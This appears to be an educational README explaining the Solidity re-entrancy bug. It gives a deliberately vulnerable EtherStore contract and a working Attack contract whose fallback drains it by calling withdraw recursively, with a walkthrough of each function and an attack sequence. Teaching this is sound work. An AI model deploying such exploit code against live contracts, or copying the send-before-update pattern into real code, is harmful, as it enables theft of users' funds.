# Reentrancy attack

This  is a simple Ethereum smart contract example to demonstrate the re-entrancy vulnerability in Solidity. The contract allows users to deposit and withdraw Ether, but it is vulnerable to re-entrancy attacks.

## Contract Overview
## EtherStore Contract
The EtherStore contract allows users to deposit and withdraw Ether. It maintains a balance mapping to track the Ether deposited by each user.

```bash 
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract EtherStore {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 bal = balances[msg.sender];
        require(bal > 0);

        (bool sent,) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

```

## Functions
deposit():

Allows users to deposit Ether into the contract.
Updates the user's balance.

```bash
function deposit() public payable {
    balances[msg.sender] += msg.value;
}
```
withdraw():

Allows users to withdraw their deposited Ether.Ether is sent to the user and then balance is updated.

```bash
function withdraw() public {
    uint256 bal = balances[msg.sender];
    require(bal > 0);

    (bool sent,) = msg.sender.call{value: bal}("");
    require(sent, "Failed to send Ether");

    balances[msg.sender] = 0;
}
```

getBalance():

Helper function to check the balance of the contract.

```bash
function getBalance() public view returns (uint256) {
    return address(this).balance;
}
```

## Re-entrancy Vulnerability

The `withdraw` function in the `EtherStore` contract is vulnerable to re-entrancy attacks. This is because the Ether transfer is made before updating the user's balance. An attacker could exploit this by recursively calling the withdraw function before their balance is set to zero.


# Attack contract

The `Attack` contract is designed to exploit the re-entrancy vulnerability in the `EtherStore` contract. It does this by repeatedly calling the `withdraw` function of `EtherStore` before the original `withdraw` call completes, thereby draining Ether from the `EtherStore` contract.

```bash
contract Attack {
    EtherStore public etherStore;
    uint256 public constant AMOUNT = 1 ether;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= AMOUNT) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= AMOUNT);
        etherStore.deposit{value: AMOUNT}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

State Variables

```bash
EtherStore public etherStore;
uint256 public constant AMOUNT = 1 ether;
```

`etherStore`: This variable holds the reference to the deployed EtherStore contract that will be attacked.
`AMOUNT`: This constant defines the amount of Ether (1 Ether) that will be used in the attack.

Constructor

```bash
constructor(address _etherStoreAddress) {
    etherStore = EtherStore(_etherStoreAddress);
}
```

The constructor initializes the `etherStore` variable with the address of the deployed `EtherStore` contract.

Fallback Function

```bash
fallback() external payable {
    if (address(etherStore).balance >= AMOUNT) {
        etherStore.withdraw();
    }
}
```

`fallback()`: This special function is called when Ether is sent to the `Attack` contract and no other function matches the call. In this context, it's triggered when the `EtherStore` contract sends Ether to the `Attack` contract.
Condition Check: If the balance of `EtherStore` is greater than or equal to `AMOUNT` (1 Ether), the `withdraw` function of `EtherStore` is called again, recursively initiating another withdrawal.


Attack Function

```bash
function attack() external payable {
    require(msg.value >= AMOUNT);
    etherStore.deposit{value: AMOUNT}();
    etherStore.withdraw();
}
```

`attack()`: This function initiates the attack.
Check: Ensures that at least 1 Ether is sent with the call.
Deposit: Calls the deposit function of EtherStore to deposit 1 Ether into the EtherStore contract.
Withdraw: Calls the `withdraw` function of `EtherStore`, triggering the fallback function when Ether is sent back, causing a recursive withdrawal until the `EtherStore` contract is drained or the balance is below 1 Ether.



Helper Function

```bash
function getBalance() public view returns (uint256) {
    return address(this).balance;
}
```

`getBalance()`: This function allows anyone to check the balance of the Attack contract.


# Attack Sequence

1. Deployment
Deploy the EtherStore contract.
Deploy the Attack contract with the address of the deployed EtherStore contract.

2. Initiate Attack:
Call the attack function on the Attack contract, sending at least 1 Ether.
The Attack contract deposits 1 Ether into the EtherStore contract using the deposit function.
The Attack contract then calls the withdraw function on the EtherStore contract.
The EtherStore contract attempts to send 1 Ether back to the Attack contract.
The fallback function of the Attack contract is triggered by the Ether transfer.
If the balance of EtherStore is still at least 1 Ether, the withdraw function is called again, causing a re-entrant call and repeating the process.




3.Draining Ether
The process continues recursively, draining Ether from the `EtherStore` contract until its balance is less than 1 Ether or the gas limit is reached.

Summary

The `Attack` contract exploits the re-entrancy vulnerability in the `EtherStore` contract by using a fallback function to recursively call the `withdraw` function, allowing it to drain the `EtherStore` contract of its Ether balance. 


